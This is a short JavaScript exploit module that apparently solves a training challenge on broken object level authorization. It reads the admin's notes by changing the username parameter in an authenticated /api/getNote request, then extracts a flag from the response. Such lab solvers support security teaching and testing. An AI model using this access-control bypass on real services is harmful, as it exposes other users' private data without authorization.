/**
 * Challenge: 0xa1 - Broken Object Level Authorization
 * Exploit: Access admin's notes via /api/getNote?username=admin
 */

const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa1');
    log('Starting 0xa1 exploit: Broken Object Level Authorization');

    // Get admin's notes by changing username parameter
    const result = await httpRequest(`${baseUrl}/api/getNote?username=admin`, {
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${token}`,
        },
    });

    log(`Response: ${JSON.stringify(result.data)}`);

    // Check if flag is in response
    const flag = extractFlag(JSON.stringify(result.data));
    if (flag) {
        saveFlag(flag);
        return { success: true, flag };
    }

    // Check if we got notes (exploit successful even without flag)
    if (result.data && (result.data.note || result.data.notes)) {
        log('✅ Exploit successful - accessed admin notes');
        log(`Note content: ${JSON.stringify(result.data)}`);
        return { success: true };
    }

    log('❌ Exploit failed - could not access admin notes');
    return { success: false };
}

module.exports = { run };
